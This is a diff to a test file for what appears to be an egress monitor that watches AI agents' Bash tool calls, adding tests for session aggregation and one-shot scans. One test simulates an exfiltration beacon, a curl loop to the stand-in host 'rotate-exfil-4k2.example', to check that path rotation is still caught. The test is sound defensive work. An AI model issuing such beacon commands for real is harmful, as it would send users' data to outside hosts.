@@ -8,6 +8,7 @@ import { processToolCall } from "../hooks/core.js";
 import { summarizeSession, rotateSession, listSessions, sessionFile } from "../store/session.js";
 
 const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
+const BENIGN_SCAN = "curl https://example.com/status";
 
 process.env.EGRESS_EYE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), "egress-eye-session-"));
 process.env.EGRESS_EYE_OFFLINE = "1";
@@ -73,9 +74,34 @@ test("repeated contacts with the same unknown host produce a sharded-egress aggr
     });
   }
   const summary = summarizeSession("sess-d");
-  assert.equal(summary.urlUnique, 1);
-  assert.equal(summary.byVerdict.unknown, 1);
+  assert.equal(summary.urlUnique, 1, "same path six times = one unique URL with count 6");
+  assert.equal(summary.rows[0]!.count, 6);
   assert.ok(summary.aggregates.some((a) => a.includes("repeated-egress")), JSON.stringify(summary.aggregates));
+});
+
+test("path rotation cannot defeat host-level aggregation", async () => {
+  for (let i = 0; i < 6; i++) {
+    await processToolCall({
+      event: "pre-tool-use",
+      tool: "Bash",
+      input: { command: `curl https://rotate-exfil-4k2.example/beacon/${i}?n=${i}` },
+      sessionId: "sess-d2",
+    });
+  }
+  const summary = summarizeSession("sess-d2");
+  assert.equal(summary.urlUnique, 6);
+  assert.ok(summary.aggregates.some((a) => a.includes("rotate-exfil-4k2.example")), JSON.stringify(summary.aggregates));
+});
+
+test("one-shot checks (persist:false) never create or touch the pointer session", async () => {
+  const pointerBefore = fs.existsSync(path.join(process.env.EGRESS_EYE_HOME!, "current-session.json"));
+  const r = await processToolCall(
+    { event: "pre-tool-use", tool: "scan", input: { command: BENIGN_SCAN }, sessionId: null },
+    { persist: false },
+  );
+  assert.equal(r.sessionId, "");
+  const pointerAfter = fs.existsSync(path.join(process.env.EGRESS_EYE_HOME!, "current-session.json"));
+  assert.equal(pointerAfter, pointerBefore);
 });
 
 test("listSessions returns recorded sessions newest first", async () => {
